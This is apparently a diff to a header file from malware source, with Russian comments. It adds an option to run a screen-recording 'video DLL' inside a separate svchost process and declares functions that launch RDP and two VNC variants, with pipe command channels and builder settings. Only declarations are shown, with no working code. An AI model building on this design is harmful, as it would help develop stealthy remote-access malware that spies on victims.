@@ -7,6 +7,9 @@
 #include "DllLoader.h"
 #include "Pipes.h"
 
+//если объявлен, то видеодлл запускается в отдельном свцхосте, иначе (если закомментировать)
+//будет запускаться в процессе LoaderRoutine
+#define VideoProcessSvchost
 
 // Настройки парметров для билдера
 #define VIDEOREC_PARAM_SIZE_HOST 50
@@ -98,6 +101,8 @@ namespace VideoProcess
 
 //инициализирует видео длл и стартует пайп канал для приема команд на выполнение
 bool Start();
+//запускает Start() в отдельном свцхосте
+DWORD WINAPI StartSvchost(void*);
 //завершение работы видео процесса
 void Stop();
 //возвращает имя пайп канала для видео процесса
@@ -118,6 +123,8 @@ void UpdateSettings( int server, int setFlags, int resetFlags, int downtime );
 DWORD WINAPI ProcessRDP(void*);
 //запуск vnc.exe
 DWORD WINAPI ProcessVNC(void*);
+//запуск другой версии vnc.exe
+DWORD WINAPI ProcessVNC2(void*);
 };
 
 //класс для упрощения отправки логов, тут запоминается имя лога, чтобы не писать его в каждой строчке
